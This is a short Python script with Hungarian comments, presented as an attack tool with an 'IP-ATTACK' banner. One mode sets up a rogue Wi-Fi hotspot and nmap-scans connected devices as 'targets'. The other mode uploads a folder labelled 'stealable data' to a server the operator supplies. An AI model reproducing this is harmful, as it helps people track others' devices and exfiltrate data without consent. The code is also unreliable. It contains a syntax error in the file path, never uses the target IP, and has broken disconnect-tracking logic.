import subprocess
import re
import time
import requests

def Banner():             
    print("  _______     _______      _______     _      _       _     _     _______     _______                                               ")
    print(" |  _____|   |  ___  |    |  ___  |   | \    / |     | |   | |   |  ___  |   |_______|      ")
    print(" | |         | |___| |    | |   | |    \ \  / /      | |   | |   | |   | |      | |         ")
    print(" | |         |  _  __|    | |___| |     \ \/ /       | |___| |   | |___| |      | |         ")
    print(" | |  ___    | | \ \      |       |      \  /        | |___| |   |       |      | |         ")
    print(" | | |__ |   | |  \ \     |  / \  |       | |        | |   | |   |  / \  |      | |         ")
    print(" | |____||   | |   \ \    | /   \ |       | |        | |   | |   | /   \ |      | |         ")
    print(" |_______|   |_|    \_\   |/     \|       |_|        |_|   |_|   |/     \|      |_|         ")
    print("                                     Only on Linux                                          ")
    print(f"BY: Crashi                          Version 1.0                                            ")
    print()
    print()
    print("Hotspot IP-Tracker[1]")
    print()
    print("IP-ATTACK[2]")
    print()
Banner()    
x = int(input("Enter the attack number: "))
if x == 1:
    hotspot_config = """
    interface=wlan0
    driver=nl80211
    ssid=YourHotspotName
    hw_mode=g
    channel=6
    wmm_enabled=0
    macaddr_acl=0
    auth_algs=1
    ignore_broadcast_ssid=0
    wpa=2
    wpa_passphrase=YourPassword
    wpa_key_mgmt=WPA-PSK
    wpa_pairwise=TKIP
    rsn_pairwise=CCMP
    """

    def create_hotspot():
        with open("/etc/hostapd/hotspot.conf", "w") as config_file:
            config_file.write(hotspot_config)
            
        subprocess.run(['sudo', 'hostapd', '/etc/hostapd/hotspot.conf'])

    def track_connected_devices():
        connected_devices = set()  # Az aktuálisan csatlakoztatott eszközök nyomon követése

        while True:
            nmap_output = subprocess.check_output(['sudo', 'nmap', '-sn', '192.168.0.0/24'])
            nmap_output = nmap_output.decode('utf-8')
            pattern = re.compile(r'Host (\d+\.\d+\.\d+\.\d+) .*?([0-9A-Fa-f:]{17}) \((.*?)\)')
            matches = pattern.findall(nmap_output)

            for ip, mac, device_name in matches:
                if mac not in connected_devices:
                    print(f"Célpont bemérve: {device_name} ({ip})")
                    connected_devices.add(mac)

            # Ellenőrizzük, hogy az aktuálisan nyomon követett eszközök továbbra is csatlakoztatva vannak
            disconnected_devices = connected_devices.copy()
            for ip, mac, _ in matches:
                for mac in disconnected_devices:
                    disconnected_devices.discard(mac)

            for mac in disconnected_devices:
                print(f"{mac} lecsatlakozott")

            time.sleep(60)

    create_hotspot()
    track_connected_devices()
    #tenksz jú
if x == 2:
    def fajl_feltoltes(ip_cim, fajl_nev):
        url = input("Add meg a szervered címét: ")  # Módosítsd a szervered IP címére és feltöltési végpontjára
        files = {'file': open(fajl_nev, 'rb')}  # Az 'file' kulcs a feltöltött fájl neve
        response = requests.post(url, files=files)
        
        if response.status_code == 200:
            print(f"A fájl feltöltése sikeres volt.")
        else:
            print(f"A fájl feltöltése nem sikerült. Státusz kód: {response.status_code}")
    
    ip_cim = input("Add meg a célpont ip címét: ")
    fajl_nev = r"C:\Users\Hp\OneDrive\Asztali gép\ellopható adatok\"  

    fajl_feltoltes(ip_cim, fajl_nev)

else:
    print("Fatal ERROR")    
